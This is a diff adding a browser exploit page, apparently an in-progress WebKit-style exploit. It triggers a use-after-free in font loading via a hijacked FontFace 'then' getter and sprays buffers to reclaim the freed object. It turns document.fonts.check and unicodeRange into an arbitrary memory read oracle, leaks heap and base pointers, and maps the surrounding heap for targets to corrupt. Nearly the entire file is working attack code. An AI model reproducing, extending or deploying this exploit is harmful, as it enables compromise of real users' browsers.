@@ -1,0 +1,569 @@
+<!--
+  p812 v4: WIDE heap map — classify objects around spray
+
+  Goal: Map bmalloc pages around SELF to find:
+  - Our spray buffers (marker 0x1000+k)
+  - Target buffers (marker 0xA000/0xB000)
+  - Butterfly headers (vectorLength 15..35)
+  - Live C++ objects (boundary -1: from > to)
+  - Free/zero slots
+
+  Method: boundary() oracle at each slot base, two-pass scan:
+    Pass 1: boundary classify ±SCAN_N slots (inline row beacons)
+    Pass 2: urRead 48B detail on interesting slots
+    Pass 3: adjacency deep scan (3 offsets per ±8 neighbors)
+
+  Params: ?k=32 (spray count) &pw=80 (pause ms) &sn=128 (scan radius)
+  Budget: ~6.5K oracle calls for sn=128 (safe; OOM at ~30K)
+  CRASH_CLASS: LOW (heap reads via oracle, no writes to foreign objects)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p812 Wide Heap Map</title></head>
+<body>
+<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">RUNNING</div>
+<pre id="out" style="font:11px monospace;white-space:pre-wrap">p812 v4 — wide heap map</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var UID=Math.random().toString(36).slice(2,8).toUpperCase();
+
+function b(m){try{O.textContent+='\n'+m;}catch(e){}
+  try{navigator.sendBeacon('/beacon/P812-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID);}catch(e){}}
+function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P812-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m+'-XLOST');}catch(e2){}}}
+function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}
+
+function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
+var K=qint('k',32), PW=qint('pw',80), SCAN_N=qint('sn',128);
+var SIZE=192, fired=false, faces=null;
+
+/* --- helpers --- */
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
+function hex(x){if(typeof x==='bigint')return '0x'+x.toString(16);return '0x'+x.toString(16);}
+
+/* ============================================================
+   PRE-UAF: Butterfly spray (23-element double arrays → 192B)
+   ============================================================ */
+var BF_COUNT=200, BF_ELEMS=23;
+var bfArrays=[];
+for(var bi=0;bi<BF_COUNT;bi++){
+  var arr=new Array(BF_ELEMS);
+  for(var bj=0;bj<BF_ELEMS;bj++) arr[bj]=1.1+bi*0.001+bj*0.0001;
+  bfArrays.push(arr);
+}
+b('BF-PRE-'+BF_COUNT+'x'+BF_ELEMS);
+
+/* PRE-UAF: Target buffers with known marker */
+var TGT_COUNT=128;
+var targets=[];
+for(var ti=0;ti<TGT_COUNT;ti++){
+  var tb=new Uint8Array(new ArrayBuffer(SIZE));
+  put32(tb,0,0xA000); put32(tb,4,0xB000);
+  put32(tb,8,0x812A0000|ti); put32(tb,12,0xFACE0812);
+  targets.push(tb);
+}
+b('TGT-'+TGT_COUNT+'x'+SIZE+'B');
+
+/* --- crash-loop guard --- */
+var CK='p812v9_tries';
+var MAX_TRIES=15,tries=0;
+try{tries=parseInt(localStorage.getItem(CK)||'0',10);}catch(e){}
+var GUARD_HALT=false;
+if(tries>=MAX_TRIES){GUARD_HALT=true;b('LOOP-GUARD-'+tries);verd('bad','CRASH LOOP ('+tries+')');
+  setTimeout(function(){try{localStorage.removeItem(CK);}catch(e){}location.replace('/?_='+Date.now());},8000);}
+else{
+  try{localStorage.setItem(CK,String(tries+1));}catch(e){}
+  b('VER-P812v9');b('BOOT-'+UID+',try='+(tries+1)+',sn='+SCAN_N);
+}
+
+/* ============================================================
+   PHASE 1: UAF trigger + spray
+   ============================================================ */
+function start(){
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(phase,PW);},
+                                               function(e){b('RJ-'+String(e&&e.name));});
+  setTimeout(function(){if(!faces)b('NOFACES');},1500);
+}
+
+/* ============================================================
+   PHASE 2: Oracle setup + self-scan
+   ============================================================ */
+function phase(){
+  var bufs=[],bufl1=[],L1=0n,L2=0n,rawL=null;
+  var preForgeQ=null;
+
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
+    if(a>0x1000000000n){
+      bufs.push([window.__sp[i],c]);bufl1.push(a);
+      if(!rawL){
+        rawL=[a,c];
+        preForgeQ=[];
+        for(var po=0;po<SIZE;po+=8)preForgeQ.push(le(window.__sp[i],po));
+      }
+    }
+  }
+  if(rawL){L1=rawL[0];L2=rawL[1];}
+  b('L1-'+hex(L1));b('L2-'+hex(L2));
+  if(!bufs.length||L2===0n){b('NOLEAK');verd('bad','NOLEAK');setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},3000);return;}
+
+  if(preForgeQ){
+    var pfH='',pfNZ=0;
+    for(var pi=0;pi<preForgeQ.length;pi++){
+      var pv=preForgeQ[pi];
+      if(pv>0n)pfNZ++;
+      if(pv>0xF00000000n&&pv<0x20000000000n)pfH+=(pfH?',':'')+((pi*8).toString(16))+'='+pv.toString(16);
+    }
+    b('PF-'+(pfH||'none'));
+    b('VT-'+preForgeQ[0].toString(16)+',nz='+pfNZ);
+    var pfX='';
+    for(var px=0;px<preForgeQ.length;px++){
+      var xv=preForgeQ[px];
+      if(xv>0n&&!(xv>0xF00000000n&&xv<0x20000000000n))pfX+=(pfX?',':'')+((px*8).toString(16))+'='+xv.toString(16);
+    }
+    if(pfX)b('PFX-'+pfX);
+  }
+
+  /* forge for oracle mode — ALL spray bufs, not just leaked ones */
+  var forgeL2=(bufs.length>0)?bufs[0][1]:L2;
+  for(var ib=0;ib<window.__sp.length;ib++){
+    var vb=window.__sp[ib];
+    vb[0]=0; vb[3]=0; put64(vb,0x08,forgeL2); vb[0x10]=0; vb[0x82]=0;
+  }
+  b('FORGED-'+bufs.length+'/'+window.__sp.length);
+
+  setTimeout(function(){
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    b('FAMILY-OK');
+    setTimeout(function(){
+      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+      b('ADD-OK');
+      setTimeout(function(){
+        var fam=null,zi=-1;
+        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;zi=q;window.__zi=q;break;}}
+        b('INTABLE-'+fam);
+        if(!fam){b('NOTIN');verd('bad','NOTIN');return;}
+        for(var is2=0;is2<window.__sp.length;is2++){window.__sp[is2][0x28]=1;window.__sp[is2][0x2C]=1;}
+
+        /* --- oracle functions --- */
+        var self=0n,selfFound=false;
+        var SKIPJ=-1;
+        function setR(t){for(var ir=0;ir<window.__sp.length;ir++){if(SKIPJ>=0&&ir===SKIPJ)continue;put64(window.__sp[ir],0x20,t);}}
+        function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c))===false;}catch(e){return null;}}
+        function boundary(tgt){
+          setR(tgt);
+          if(chk(0)!==true)return -1;
+          var lo=0,hi=0x10FFFF,res=-1;
+          while(lo<=hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null)break;if(r===true){res=mid;lo=mid+1;}else hi=mid-1;}
+          return res;
+        }
+
+        /* --- oracle validation --- */
+        var t1=-1,l2i=-1,oracleOff=0n;
+        var OO_A=[];for(var oa=0;oa<=0x38;oa+=4)OO_A.push(BigInt(oa));
+        var OO_U=[0x05n,0x07n,0x0Bn,0x0Fn,0x13n,0x17n,0x1Bn,0x1Fn,0x23n,0x27n];
+        var OO_ALL=OO_A.concat(OO_U);
+        for(var q8=0;q8<bufs.length&&t1<0;q8++){
+          L1=bufl1[q8];L2=bufs[q8][1];
+          for(var oi=0;oi<OO_ALL.length;oi++){
+            setR(L2+OO_ALL[oi]);
+            if(chk(0)===true){t1=boundary(L2+OO_ALL[oi]);if(t1>=0){oracleOff=OO_ALL[oi];l2i=q8;break;}}
+          }
+        }
+        if(l2i>0)b('L2SEL-'+l2i);
+        if(l2i<0){L1=bufl1[0];L2=bufs[0][1];}
+        var oracleAlive=(t1>=0);
+        for(var ipd=0;ipd<window.__sp.length;ipd++){var vpd=window.__sp[ipd];
+          vpd[0x38]=0x00;vpd[0x39]=0x10;vpd[0x3A]=0x00;vpd[0x3B]=0x00;
+          vpd[0x3C]=0x00;vpd[0x3D]=0x20;vpd[0x3E]=0x00;vpd[0x3F]=0x00;}
+        if(!oracleAlive){b('A-DEAD');verd('bad','ORACLE DEAD — retry');
+          setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},2000);return;}
+        b('ORACLE-ALIVE-off='+hex(oracleOff));
+
+        /* --- UR chain read helpers (also used by detail pass) --- */
+        function urRead(addr,n){
+          for(var ui=0;ui<window.__sp.length;ui++){
+            if(SKIPJ>=0&&ui===SKIPJ)continue;
+            put64(window.__sp[ui],0x20,addr);
+            put32(window.__sp[ui],0x28,n);put32(window.__sp[ui],0x2C,n);
+          }
+          try{return String(faces[zi].unicodeRange);}catch(e){return null;}
+        }
+        function urParse(raw){
+          if(!raw)return [];
+          var parts=raw.split(','),res=[];
+          for(var i=0;i<parts.length;i++){
+            var m=/U\+([0-9a-fA-F]+)(?:-([0-9a-fA-F]+))?/.exec(parts[i]);
+            if(m){
+              var f=parseInt(m[1],16)>>>0,t=m[2]?(parseInt(m[2],16)>>>0):f;
+              res.push(BigInt(f)|(BigInt(t)<<32n));
+            }
+          }
+          return res;
+        }
+        function urRead48(addr){return urParse(urRead(addr,6));}
+        function urRestore(){
+          for(var ur=0;ur<window.__sp.length;ur++){
+            if(SKIPJ>=0&&ur===SKIPJ)continue;
+            put64(window.__sp[ur],0x20,self+0x38n);
+            put32(window.__sp[ur],0x28,1);put32(window.__sp[ur],0x2C,1);
+          }
+        }
+
+        /* --- Phase UR: unicodeRange chain read → SELF --- */
+        var urT=urRead(L2,1);
+        var urOK=(urT!==null&&/^U\+/.test(urT));
+        if(urOK){
+          bs('UR-T-'+urT.substring(0,80));
+          var ur1r=urRead(L1-0x10n,10);
+          var ur1=urParse(ur1r);
+          bs('UR1-n='+ur1.length+(ur1r?',raw='+ur1r.substring(0,60):''));
+          var IM=0n;
+          for(var ui1=2;ui1<ur1.length&&ui1<10;ui1++){
+            if(ur1[ui1]>0x1000000000n&&ur1[ui1]<0x20000000000n){IM=ur1[ui1];bs('UR-IM=q'+ui1+'='+hex(IM));break;}
+          }
+          if(IM===0n)for(var ui1b=0;ui1b<2&&ui1b<ur1.length;ui1b++){
+            if(ur1[ui1b]>0x1000000000n&&ur1[ui1b]<0x20000000000n){IM=ur1[ui1b];bs('UR-IM=q'+ui1b+'='+hex(IM)+',early');break;}
+          }
+          if(IM>0n){
+            var ur2=urParse(urRead(IM+8n,2));
+            var FO=(ur2.length>=1)?ur2[0]:0n;
+            bs('UR-FO='+hex(FO));
+            if(FO>0x1000000000n&&FO<0x20000000000n){
+              var ur3=urParse(urRead(FO,4));
+              var VP_=(ur3.length>=1)?ur3[0]:0n;
+              var fo08_=(ur3.length>=2)?ur3[1]:0n;
+              var mB_=(ur3.length>=3)?ur3[2]:0n;
+              bs('UR-VP='+hex(VP_)+',fo08='+hex(fo08_)+',mB='+hex(mB_));
+              if(fo08_===L2)bs('UR-L2-MATCH');
+              if(mB_>0x1000000000n&&mB_<0x20000000000n){
+                self=mB_;selfFound=true;
+                b('SELF-UR-'+hex(self));
+              }
+              if(VP_>0x800000000n&&VP_<0x900000000n){
+                bs('UR-BASE='+hex(VP_-0x724DB28n));
+              }
+            }
+          }
+          if(!selfFound)bs('UR-CHAIN-MISS');
+        }else{bs('UR-SKIP:'+(urT===null?'THROW':encodeURIComponent((urT||'').substring(0,40))));}
+        for(var ur4=0;ur4<window.__sp.length;ur4++){
+          put32(window.__sp[ur4],0x28,1);put32(window.__sp[ur4],0x2C,1);
+        }
+
+        /* --- Phase SELFIDX: identify which __sp[] IS the font-table buffer --- */
+        var selfIdx=-1,n3=0;
+        if(!selfFound && oracleAlive && t1>=0){
+          setR(L2+oracleOff);
+          var bline=chk(t1);
+          bs('SD-bl='+bline+',t1='+t1+',off='+hex(oracleOff));
+
+          /* global kill: ALL size=0 → does oracle change? */
+          for(var gk=0;gk<window.__sp.length;gk++)put32(window.__sp[gk],0x28,0);
+          var gkR=chk(t1);
+          for(var gk2=0;gk2<window.__sp.length;gk2++)put32(window.__sp[gk2],0x28,1);
+          bs('SD-gk='+gkR);
+
+          if(bline===true){
+            /* Method 1: size elimination (only if global kill proves it works) */
+            if(gkR!==bline){
+              for(var sij=0;sij<window.__sp.length&&selfIdx<0;sij++){
+                put32(window.__sp[sij],0x28,0);
+                var tst=chk(t1);
+                put32(window.__sp[sij],0x28,1);
+                if(tst!==bline)selfIdx=sij;
+              }
+              bs('SD-szM='+selfIdx);
+            }
+            /* Method 2: buffer-pointer elimination (fallback) */
+            if(selfIdx<0){
+              var altOff=(oracleOff===0n)?4n:0n;
+              setR(L2+altOff);
+              var altBl=chk(t1);
+              setR(L2+oracleOff);
+              bs('SD-alt='+altBl);
+              if(altBl!==bline){
+                for(var sij2=0;sij2<window.__sp.length&&selfIdx<0;sij2++){
+                  put64(window.__sp[sij2],0x20,L2+altOff);
+                  var tst2=chk(t1);
+                  put64(window.__sp[sij2],0x20,L2+oracleOff);
+                  if(tst2!==bline)selfIdx=sij2;
+                }
+                bs('SD-ptrM='+selfIdx);
+              }
+            }
+          }
+          b('SELFIDX-'+selfIdx);
+        }
+
+        /* --- Phase RS: range scan with unique SELF signature --- */
+        if(!selfFound && selfIdx>=0){
+          window.__sp[selfIdx][0x38]=0xEF;window.__sp[selfIdx][0x39]=0xBE;
+          window.__sp[selfIdx][0x3A]=0x00;window.__sp[selfIdx][0x3B]=0x00;
+          window.__sp[selfIdx][0x3C]=0xAD;window.__sp[selfIdx][0x3D]=0xDE;
+          window.__sp[selfIdx][0x3E]=0x00;window.__sp[selfIdx][0x3F]=0x00;
+          var rsMin=L1<L2?L1:L2,rsMax=L1>L2?L1:L2;
+          var rsHi=rsMax&(~0xFn);
+          var rsLo=rsMin-0x800000n;if(rsLo<0x1000000000n)rsLo=0x1000000000n;
+          rsLo=rsLo&(~0xFn);
+          var rsEst=Number((rsHi-rsLo)/0x10n);
+          bs('RS-'+hex(rsHi)+'-'+hex(rsLo)+',n='+rsEst);
+          for(var rsa=rsHi;rsa>=rsLo&&!selfFound;rsa-=0x10n){
+            put64(window.__sp[selfIdx],0x20,rsa+0x38n);
+            n3++;
+            if(chk(0xBEEF)===true){
+              if(chk(0xBEEE)===false&&chk(0xDEAD)===true&&chk(0xDEAE)===false){
+                self=rsa;selfFound=true;
+                b('SELF-RS-'+hex(self));
+              }
+            }
+            if(n3%131072===0)bs('RS-p-'+n3);
+          }
+          window.__sp[selfIdx][0x38]=0x00;window.__sp[selfIdx][0x39]=0x10;
+          window.__sp[selfIdx][0x3A]=0x00;window.__sp[selfIdx][0x3B]=0x00;
+          window.__sp[selfIdx][0x3C]=0x00;window.__sp[selfIdx][0x3D]=0x20;
+          window.__sp[selfIdx][0x3E]=0x00;window.__sp[selfIdx][0x3F]=0x00;
+          if(!selfFound)bs('RS-MISS-'+n3);
+        }
+
+        /* --- PH3: Smart self-find fallback (heuristic + page scan) --- */
+        if(preForgeQ&&!selfFound){
+          for(var pi3=0;pi3<preForgeQ.length&&!selfFound;pi3++){
+            var pv3=preForgeQ[pi3];
+            if(pv3<=0x1000000000n||pv3>=0x20000000000n)continue;
+            var pvPg=pv3&(~0x3FFFn);
+            for(var KK=0n;KK<=0xB8n&&!selfFound;KK+=8n){
+              if(pv3<=KK)continue;
+              var ca=pv3-KK;
+              if(ca+0x38n<pvPg)continue;
+              if(ca+0x3Fn>=pvPg+0x4000n)continue;
+              setR(ca+0x38n);n3++;
+              if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+                self=ca;selfFound=true;
+                b('SELF-H-'+hex(ca)+',off='+((pi3*8).toString(16))+',K='+KK.toString(16));
+              }
+            }
+          }
+        }
+        if(!selfFound)bs('PH3-HA-miss,n='+n3);
+
+        if(!selfFound){
+          var pgSet={};
+          if(preForgeQ){
+            for(var pi2=0;pi2<preForgeQ.length;pi2++){
+              var pv2=preForgeQ[pi2];
+              if(pv2>0x1000000000n&&pv2<0x20000000000n)pgSet[(pv2&(~0x3FFFn)).toString()]=pv2&(~0x3FFFn);
+            }
+          }
+          pgSet[(L1&(~0x3FFFn)).toString()]=L1&(~0x3FFFn);
+          pgSet[(L2&(~0x3FFFn)).toString()]=L2&(~0x3FFFn);
+          var pgArr=[];for(var pk in pgSet)pgArr.push(pgSet[pk]);
+          /* add ±1 adjacent pages for each known page */
+          var pgAdj=[];
+          for(var pai=0;pai<pgArr.length;pai++){
+            var pm=pgArr[pai]-0x4000n;if(pm>0x1000000000n)pgAdj.push(pm);
+            var pp2=pgArr[pai]+0x4000n;if(pp2<0x20000000000n)pgAdj.push(pp2);
+          }
+          for(var paj=0;paj<pgAdj.length;paj++){
+            if(!pgSet[pgAdj[paj].toString()]){pgSet[pgAdj[paj].toString()]=pgAdj[paj];pgArr.push(pgAdj[paj]);}
+          }
+          bs('PH3-PG,n='+pgArr.length);
+          for(var gi=0;gi<pgArr.length&&!selfFound;gi++){
+            for(var po2=0n;po2<0x4000n-0x3Fn&&!selfFound;po2+=0x10n){
+              setR(pgArr[gi]+po2+0x38n);n3++;
+              if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+                self=pgArr[gi]+po2;selfFound=true;
+                b('SELF-PG-'+hex(self)+',pg='+hex(pgArr[gi]));
+              }
+            }
+          }
+        }
+
+        if(!selfFound){
+          b('NOSELF-'+n3);verd('bad','NOSELF '+n3);
+          setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},2000);
+          return;
+        }
+        var sb1=Number((self>>8n)&0xFFn),sb2=Number((self>>16n)&0xFFn);
+        b('SELF-'+hex(self)+',b1=0x'+sb1.toString(16)+',b2=0x'+sb2.toString(16)+',n3='+n3);
+        b('SELF-DIST-'+hex(self>L2?self-L2:L2-self));
+
+        if(bufs.length>1){
+          var sjt=boundary(self);
+          if(sjt>=0x1000&&sjt<0x1000+K){SKIPJ=sjt-0x1000;}
+        }
+        b('SKIPJ-'+SKIPJ);
+        for(var ir2=0;ir2<window.__sp.length;ir2++){if(SKIPJ>=0&&ir2===SKIPJ)continue;put64(window.__sp[ir2],0x20,self+0x38n);}
+
+        /* ============================================================
+           PHASE 4: WIDE HEAP MAP
+           boundary() at each slot base, inline row beacons every 16
+           ============================================================ */
+        bs('WHMAP-START,sn='+SCAN_N+',stride='+SIZE);
+        if(SCAN_N>256)bs('WARN-OOM-RISK:sn='+SCAN_N+',est='+(((2*SCAN_N+1)*21)+'chk'));
+        var STRIDE=SIZE;
+        var hmap=[];
+        var oracleN=0;
+        var rowBuf=[],rowStartN=-SCAN_N;
+
+        for(var sn=-SCAN_N;sn<=SCAN_N;sn++){
+          var sa=self+BigInt(sn*STRIDE);
+          var sbb=boundary(sa);oracleN++;
+          var cls;
+          if(sn===0) cls='SELF';
+          else if(sbb>=0x1000&&sbb<0x1000+K) cls='S'+(sbb-0x1000);
+          else if(sbb>=0xA000&&sbb<=0xB001) cls='TGT';
+          else if(sbb>=15&&sbb<=35) cls='BF'+sbb;
+          else if(sbb===-1) cls='OBJ';
+          else if(sbb===0) cls='Z';
+          else if(sbb>0&&sbb<15) cls='lo'+sbb;
+          else cls='?'+sbb;
+          hmap.push({n:sn,bnd:sbb,cls:cls,addr:sa});
+
+          /* inline row beacon every 16 slots (crash-safe) */
+          if(rowBuf.length===0)rowStartN=sn;
+          var tag=cls;if(tag.length>4)tag=tag.substring(0,4);
+          while(tag.length<4)tag+=' ';
+          rowBuf.push(tag);
+          if(rowBuf.length>=16||sn===SCAN_N){
+            bs('R:'+rowStartN+'|'+rowBuf.join(' '));
+            rowBuf=[];
+          }
+        }
+
+        /* counts and slot indexes */
+        var cS=0,cT=0,cB=0,cO=0,cZ=0,cU=0,cLo=0;
+        var bfSlots=[],tgtSlots=[],objSlots=[];
+        for(var ci=0;ci<hmap.length;ci++){
+          var cc=hmap[ci].cls;
+          if(cc[0]==='S'&&cc!=='SELF'){cS++;}
+          else if(cc==='TGT'){cT++;tgtSlots.push(ci);}
+          else if(cc.substring(0,2)==='BF'){cB++;bfSlots.push(ci);}
+          else if(cc==='OBJ'){cO++;objSlots.push(ci);}
+          else if(cc==='Z'){cZ++;}
+          else if(cc.substring(0,2)==='lo'){cLo++;}
+          else if(cc[0]==='?'){cU++;}
+        }
+        bs('WHMAP-DONE:n='+hmap.length+',calls='+oracleN);
+        bs('COUNTS:S='+cS+',T='+cT+',BF='+cB+',OBJ='+cO+',Z='+cZ+',lo='+cLo+',unk='+cU);
+
+        /* adjacency summary: ±4 slots around SELF */
+        var adjStr='';
+        for(var ai=0;ai<hmap.length;ai++){
+          if(Math.abs(hmap[ai].n)<=4) adjStr+=(adjStr?',':'')+hmap[ai].n+':'+hmap[ai].cls;
+        }
+        bs('ADJ:'+adjStr);
+
+        /* page-level statistics */
+        var pgMap={};
+        for(var pmi=0;pmi<hmap.length;pmi++){
+          var pmPg=(hmap[pmi].addr&(~0x3FFFn)).toString(16);
+          if(!pgMap[pmPg])pgMap[pmPg]={S:0,T:0,BF:0,OBJ:0,Z:0,x:0,n:0};
+          pgMap[pmPg].n++;
+          var pcc=hmap[pmi].cls;
+          if(pcc[0]==='S'&&pcc!=='SELF')pgMap[pmPg].S++;
+          else if(pcc==='TGT')pgMap[pmPg].T++;
+          else if(pcc.substring(0,2)==='BF')pgMap[pmPg].BF++;
+          else if(pcc==='OBJ')pgMap[pmPg].OBJ++;
+          else if(pcc==='Z')pgMap[pmPg].Z++;
+          else pgMap[pmPg].x++;
+        }
+        for(var ppk in pgMap){
+          var pp=pgMap[ppk];
+          bs('PG:'+ppk+'|n='+pp.n+',S='+pp.S+',T='+pp.T+',BF='+pp.BF+',O='+pp.OBJ+',Z='+pp.Z);
+        }
+
+        /* ============================================================
+           PHASE 5: urRead DETAIL PASS
+           Read 48B of up to 10 interesting slots via unicodeRange
+           ============================================================ */
+        bs('DETAIL-START');
+        var detailT=[];
+        for(var dbi=0;dbi<bfSlots.length&&detailT.length<10;dbi++)detailT.push(hmap[bfSlots[dbi]]);
+        for(var dti=0;dti<tgtSlots.length&&detailT.length<10;dti++)detailT.push(hmap[tgtSlots[dti]]);
+        var sortedO=objSlots.slice().sort(function(a2,b2){return Math.abs(hmap[a2].n)-Math.abs(hmap[b2].n);});
+        for(var doi=0;doi<sortedO.length&&detailT.length<10;doi++)detailT.push(hmap[sortedO[doi]]);
+
+        for(var dk=0;dk<detailT.length;dk++){
+          var dt=detailT[dk];
+          var ur6=null;
+          try{ur6=urRead48(dt.addr);}catch(e){}
+          if(ur6&&ur6.length>0){
+            var vals='';
+            for(var uv=0;uv<ur6.length;uv++)vals+=(uv?',':'')+ur6[uv].toString(16);
+            bs('D:n='+dt.n+','+dt.cls+'|'+vals);
+            for(var vu=0;vu<ur6.length;vu++){
+              if(ur6[vu]>0x800000000n&&ur6[vu]<0xA00000000n)
+                bs('D-VT:n='+dt.n+',q'+vu+'='+hex(ur6[vu]));
+            }
+          }else{
+            bs('D:n='+dt.n+','+dt.cls+'|FAIL');
+          }
+          urRestore();
+        }
+        bs('DETAIL-DONE');
+
+        /* ============================================================
+           PHASE 6: ADJACENCY DEEP SCAN
+           Read boundary at +0, +8, +16 for ±8 neighbors
+           ============================================================ */
+        bs('ADEEP-START');
+        for(var adi=-8;adi<=8;adi++){
+          if(adi===0)continue;
+          var aAddr=self+BigInt(adi*STRIDE);
+          var ab0=boundary(aAddr);
+          var ab8=boundary(aAddr+8n);
+          var ab16=boundary(aAddr+16n);
+          bs('AD:'+adi+'|b0='+ab0+',b8='+ab8+',b16='+ab16);
+        }
+        bs('ADEEP-DONE');
+
+        /* ============================================================
+           FINAL: Summary and verdict
+           ============================================================ */
+        try{localStorage.removeItem(CK);}catch(e){}
+
+        var summary='SELF='+hex(self)+',stride='+STRIDE+',sn='+SCAN_N;
+        summary+='|S:'+cS+',T:'+cT+',BF:'+cB+',OBJ:'+cO+',Z:'+cZ;
+        bs('RESULT:'+summary);
+
+        var html='WIDE HEAP MAP (&plusmn;'+SCAN_N+' slots, stride='+STRIDE+')';
+        html+='<br>SELF='+hex(self)+' L2='+hex(L2);
+        html+='<br>Spray:'+cS+' Target:'+cT+' Butterfly:'+cB+' Object:'+cO+' Free:'+cZ;
+        if(cB>0) html+='<br><b style="color:green">BUTTERFLIES FOUND &mdash; '+cB+' slots</b>';
+        if(cT>0) html+='<br>TARGET BUFFERS: '+cT+' slots';
+        if(cB===0&&cT===0) html+='<br>Nothing adjacent &mdash; try ?sn=256 or more spray';
+        verd((cB>0||cT>0)?'ok':'bad',html);
+
+      },60);
+    },40);
+  },60);
+}
+
+if(!GUARD_HALT){
+if(document.readyState==='complete'||document.readyState==='interactive')
+  setTimeout(start,2000);
+else document.addEventListener('DOMContentLoaded',function(){setTimeout(start,2000);});
+}
+</script></body></html>
